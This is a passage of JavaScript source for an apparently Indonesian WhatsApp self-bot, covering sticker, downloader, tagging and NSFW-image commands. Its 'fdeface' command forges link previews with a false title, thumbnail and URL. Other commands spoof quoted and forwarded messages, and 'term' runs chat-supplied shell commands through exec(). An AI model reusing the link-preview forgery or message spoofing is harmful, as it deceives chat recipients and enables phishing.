		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break
		    case prefix+ 'upswteks':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case prefix+ 'upswimage':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case prefix+ 'upswvideo':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case prefix+ 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            break
		    case prefix+ 'public':
		              if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		          	if (banChats === false) return
		          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
		          	banChats = false
		          	fakeitem(`「 *PUBLIC-MODE* 」`)
		          	break
			case prefix+ 'self':
			          if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		          	if (banChats === true) return
		          	uptime = process.uptime()
		         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
		          	banChats = true
		          	fakeitem(`「 *SELF-MODE* 」`)
		          	break
		 	case prefix+ 'hidetag':
		     case prefix+ '_`':
		     case prefix+ '.':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumb}`)} }  } })
					break
			case prefix+ 'play':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                        sendMediaURL(from, thumb, captions)
		                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break  
		        case prefix+ 'video':
		            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
		            var srch = args.join('')
		            aramas = await yts(srch);
		            aramat = aramas.all 
		            var mulaikah = aramat[0].url                            
		                  try {
		                    ytv(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
		                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                        sendMediaURL(from, thumb, captions)
		                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break      
		    case prefix+ 'sticker': 
		    case prefix+ 'stiker':
		    case prefix+ 'sg':
		    case prefix+ 's':
		            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		                ran = '666.webp'
		                await ffmpeg(`./${media}`)
		                .input(media)
		                .on('start', function (cmd) {
		                     console.log(`Started : ${cmd}`)
		                })
		                .on('error', function (err) {
		                 console.log(`Error : ${err}`)
		                fs.unlinkSync(media)
		                reply('error')
		                })
		                .on('end', function () {
		                console.log('Finish')
		                alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
		                 fs.unlinkSync(media)
		                fs.unlinkSync(ran)
		                })
		                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		                .toFormat('webp')
		                .save(ran)
		                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		                const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = '999.webp'
		            reply(mess.wait)
		            await ffmpeg(`./${media}`)
		            .inputFormat(media.split('.')[1])
		            .on('start', function (cmd) {
		            console.log(`Started : ${cmd}`)
		            })
		            .on('error', function (err) {
		            console.log(`Error : ${err}`)
		            fs.unlinkSync(media)
		            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
		            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
		            })
		            .on('end', function () {
		            console.log('Finish')
		            alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
		            fs.unlinkSync(media)
		            fs.unlinkSync(ran)
		                })
		                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		                .toFormat('webp')
		                .save(ran)
		            } else {
		                fakegroup(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
		            }
		            break               
		    case prefix+ 'toimg':
					if (!isQuotedSticker) return fakeitem('Reply atau tag stiker nya lord!')
					fakegroup('```PROSES...```')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await alpha.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak, jgn lupa sub YT : ZEEONE OFC```')
					fs.unlinkSync(ran)
					})
					break
			case prefix+ 'ytsearch':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join('');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '❏ Title: ' + video.title + '\n'
		            ytresult += '❏ Link: ' + video.url + '\n'
		            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
		            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '◩ *SELF-BOT*'
		    		await fakethumb(tbuff,ytresult)
					break
			case prefix+ 'setreply':
			case prefix+ 'setfake':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case prefix+ 'setprefix':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					prefix = q
					fakeitem(`Succes Mengganti Prefix : ${q}`)
					break
			case prefix+ 'setfakeimg':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumb}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case prefix+ 'setthumb':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumb}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case prefix+ 'ytmp4':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
					let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks2) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						ytv(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
						if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captionsYtmp4)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})		
						})
						} catch (err) {
					    reply(mess.error.api)
						}
						break
			case prefix+ 'emoji':
					if (!q) return fakegroup('emojinya?')
					qes = args.join(' ')
					emoji.get(`${qes}`).then(emoji => {
					teks = `${emoji.images[4].url}`
		    		sendStickerFromUrl(from,`${teks}`)	
		    		console.log(teks)
		   			})
		    		break
			case prefix+ 'ytmp3':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
					let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						yta(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
					    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captions)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})
						})
						} catch (err) {
						reply(mess.error.api)
						}
						break
		    case prefix+ 'image':
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            reply(mess.wait)
		            gis(gimg, async (error, result) => {
		            n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,{url:images},image,{quoted:mek})
		            });
		            break
		 	case prefix+ 'tiktok':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
		 		if (!q) return fakegroup('Linknya?')
		 		reply(mess.wait)
				tik.ssstik(`${args[0]}`)
		    		.then(result => {
		    		console.log(result)
		    		const { videonowm, videonowm2, text } = result
		    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
		    		.then(async (a) => {
		    		me = `*Title* : ${text}\n*Link* : ${a.data}`
				alpha.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
				})
				})
		     		.catch(e => console.log(e))
		     		break
		    case prefix+ 'tiktokaudio':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
		 		if (!q) return fakegroup('Linknya?')
		 		reply(mess.wait)
		 		tik.ssstik(`${args[0]}`)
		    		.then(result => {
		    		const { music,text } = result
				alpha.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:mek})
				})
		     		.catch(e => console.log(e))
		     		break
		    case prefix+ 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
		    case prefix+ 'ig':
		        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
		        if (!q) return fakegroup('Linknya?')
		        reply(mess.wait)
			igdl(args[0])
			.then((result) => {
		    for (Y of result.url_list )
		    sendMediaURL(from,Y,'Nih')
			})
			break
		    case prefix+ 'igstalk':
		            if (!q) return fakegroup('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })      
		            break    
		    case prefix+ 'fb':
		            if (!q) return reply('Linknya?')
		            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
		            te = args.join(' ')
		            fakestatus(mess.wait)
		            Fb.getInfo(`${te}`)
		            .then(G => {
		            ten = `${G.download.sd}`
		            tek = `${G.title}`
		            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
		            })
		            break    
			case prefix+ 'term':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`SELF-BOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case prefix+ 'join':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case prefix+'twitter':
		            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
		            if (!q) return fakegroup('Linknya?')
		            ten = args[0]
		            var res = await twitterGetUrl(`${ten}`)
		            .then(g => {
		            ren = `${g.download[2].url}`
		            sendMediaURL(from,ren,'DONE')
		            })
		            break
		    case prefix+ 'runtime':
		    case prefix+ 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case prefix+ 'speed':
			case prefix+ 'ping':
					const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
					fakegroup(pingnya)
					})
					break
               
		    case prefix+ 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case prefix+ 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            owgi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owgi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break
		    case prefix+ 'tourl':
		            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
		            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            owgi = await alpha.downloadMediaMessage(boij)
		            res = await upload(owgi)
		            reply(res)
		            } else {
		            fakegroup('kirim/reply gambar/video')
		            }
		            break
/*
]=====> NSFW MENU<=====[
*/

			case prefix+ 'awoo':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'blowjob':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'hentai': 
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'megumin':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'neko':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'trapnime':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break

/*
]=====> GROUP MENU<=====[
*/
  
			case 'add':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					if (!isBotGroupAdmins) return fakestatus('```BOT HARUS JADI ADMIN```')
					if (args.length < 1) return fakestatus('Yang mau di add bapakau kah? -_-')
